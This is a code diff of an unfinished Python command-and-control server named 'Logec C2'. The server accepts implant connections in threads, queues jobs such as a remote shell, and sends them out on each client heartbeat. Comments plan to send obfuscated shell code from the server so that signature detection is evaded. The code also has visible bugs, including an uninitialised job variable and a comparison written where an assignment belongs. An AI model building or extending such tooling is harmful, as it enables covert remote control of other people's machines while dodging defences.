@@ -1,28 +1,16 @@
-## New Server Code
-
-## Order: start socket, bind to address, and listen for connections. Each new
-#connection needs to be in its own thread
-
 import subprocess as sp
 import socket
 import threading
 import time
 import os
-
 import random
-#import imports
-#import Modules.Linux.linux_info
-#import Modules.Windows.windows_info
-
 
 HEADER = 64
 FORMAT = 'utf-8'
 
-
-
 class s_sock:
     ##########
-    ## Main Thread
+    ## Main Thread/Class
     ##########
     
     def start_server(self, ip, port):
@@ -65,8 +53,9 @@ class s_sock:
             globals()[client_name] = client
             thread = threading.Thread(target=client.handle_client, args=(self.conn, self.ADDR))
 
-            thread.start()                
-            
+            thread.start()  
+    
+    ## This is temporarily imitating logec code, will get reworked eventually
     def client_interact(self):
         ## This will be returned to the client later
         print(" ===== Logec C2 Manual Shell +++++\n\n")
@@ -86,7 +75,7 @@ class s_sock:
             client_instance = self.clients[client_name]
             
             while True:
-                client_instance.local_decision_tree(input(f"Client (menu for options): [{self.ip_address}]: "))
+                client_instance.interact(input(f"Client (jobs for options): [{self.ip_address}]: "))
         
         elif client_name.lower() == "refresh":
             os.system("clear")
@@ -94,60 +83,29 @@ class s_sock:
             
         else:
             print(f"{client_name} not found.")
-    
-    ##########
-    ## In Sub Thread
-    ##########
-    
-    ## Needs a rework, including seperating handle_client to just hanlde the connection, and 
-    ## A  proper cliet_do tree. Rely on the instance to hold data when not using (aka self) instead
-    ## of passing commands into decisions tree like handle client currenlty is
-    
-    ##TLDR: handle_client only handles client connections, call client_do for actually performing client actions
-    
-class s_perclient:
-    
-    ## Each thread runs this, which will handle the client appropriatly.
-    def handle_client(self, conn, addr):
-        ## Need to hash out a standard protocol too, like who sends what etc
-        
-        # Basic Protocol. If everything obides by these, it should all work
-        '''
-        0) First connection, client sends clientID
-        0A) Server responds with ?? (maybe a confirmation)
-        
-        1) Client sends heartbeat/hello
-        2) Server recieves heartbeat. 
-        3) Server responds with job, if no job, client waits & closes the connection*
-            3a) If job, client stops heartbeat while doing job, then falls back to heartbeat
             
-        4) Once wait time is up, steps 1-4 repeat
-        
-        *If no response is received, client also waits & continues with the heartbeat
-        
-        Final:
-        
-        On fail, the client should drop back to heartbeats.
-        
-        On server fail... Restart the "start_server" function after releasing the connection?
-        
-        '''
-        
+
+##########
+## Per Client Class
+##########
+
+class s_perclient:
+    def handle_client(self, conn, addr):
+            
         self.conn = conn
         self.addr = addr
-        ## redundant of self.addr but easier to use
         self.ip = addr[0]
         self.port = addr[1]
-        
-        ##print(self.conn, self.addr)
-        
-        
-        ##print(f"New Connection from {conn.getpeername()}")
-        
-        ## Listening for anythinf from the client
+    
         while True:
-            # Receive message from client
+            # Receive/Listen for message from client
             received_msg = conn.recv(1024).decode()
+            
+            ## every time a message comes back, it has to do something
+            # This aligns with the protocol
+            
+            self.decision_tree(received_msg)
+            
             if not received_msg:
                 # Client has closed the connection, exit the loop
 
@@ -159,97 +117,57 @@ class s_perclient:
             
         # Close the connection when the loop is over
         conn.close()
-        
-        ## class needs to die when done
-
-    ## decision tree for remote/automated messages
-    def remote_decision_tree(self, msg):
-        print(f"CLIENT SAYS: {msg}")
-
-        if msg == "heartbeat":
-            print("SERVER ACTION: client_do()")
-            self.client_do()
     
+    def decision_tree(self, received_msg):
+        pass
     
-    ## decision tree for user/local commands, or from logec
-    def local_decision_tree(self, raw_cmd):
-        #print(f"USER SAYS: {cmd}")
+        if received_msg == "heartbeat":
+            ## check current_job, & send job ONLY on heartbeat
+            if self.current_job != "none":
+                self.send_msg(self.current_job)
+    
+    ## This part is what the user interacts with, and it sets self.current_job based on the decision. 
+    
+    ## Self.job executes/gets sent out when the client recieves a heartbeat
+    def interact(self, user_input_raw):
+        user_input = user_input_raw.lower()
         
-        cmd = raw_cmd.lower()
-
-        ## Keeping connected while a user is interacting
-        self.current_job = "None"
-
-        if cmd == "shell":
-            print("SERVER ACTION: client_do()")
+        if user_input == "jobs":
+            print("Jobs: \nShell [IP, Port] ")
+        
+        ## Idea for shell, have all the code on this side. That way, you just pass the string/command in, and 
+        ## can have it obsfucated. The client will then execute said code. This may also help with signatures of common
+        ## shells if embedded in the client code
+        
+        ## How it may work: Shell job gets sent, then the client listens for a followup string, which is the shellcode being sent
+        elif user_input == "shell":
             self.current_job = "shell"
-            self.client_do()
             
-        elif cmd == "menu":
-            print("Jobs: ||\n1)shell \n2)debug\n")
-            
-        elif cmd == "status":
-            print("FAKE STATUS, may show 'waiting' in future showing its waiting")
-            
-        elif cmd == "debug":
-            print(f"{self.addr}")
+        elif user_input == "adjust_heartbeat":
+            self.current_job = "adjust_heartbeat"
+        
+        elif user_input == "current_job":
+            print(self.current_job)
         
         else:
-            print("Command not found")
-        
-    
-    def client_do(self):        
-        if self.current_job == "None":
-            pass
-        
-        elif self.current_job == "wait":
-            self.send_msg("wait")
-            #here the client heartbeat timer resets & it waits
-        
-        elif self.current_job == "shell":
-            ## Telling client that I want a shell
-            print("DEBUG: client_do sending shell")
-            self.send_msg("shell")
+            self.current_job == "none"
             
-            while True:
-                shellcommand = input("$: ") ## eventually this unput will be from a different connection (from logec client) for now its local
-                
-                if shellcommand == "_exit":
-                    print("placeholder exit")
-                    #conn.close()
-                    
-                else:
-                    print(self.send_msg(shellcommand))
-            #else:
-                #print("SHELL ERR")
-        
-        
     
     def send_msg(self, message):
-        
+        print(f"Message being sent: {message}")
         self.conn.send(message.encode())
         
-        print(f"Message being sent: {message}")
-        #print("waiting on recieve message")
-        
         recieve_msg = self.conn.recv(1024).decode()
-        
+    
         return recieve_msg
-
-
+    
 if __name__ == "__main__":
     ## could listen on multiple ports with threading this whole thing
     SERV = s_sock()
-    
-    background_listen = threading.Thread(target=SERV.start_server, args=('0.0.0.0',8095))
 
+    background_listen = threading.Thread(target=SERV.start_server, args=('0.0.0.0',8096))
     background_listen.start() 
     
     #SERV.start_server('0.0.0.0',8092)
     
     SERV.client_interact()
-
-    
-    '''while True:
-        shellcommand = input("$: ")
-        SERV.send_msg(shellcommand)'''
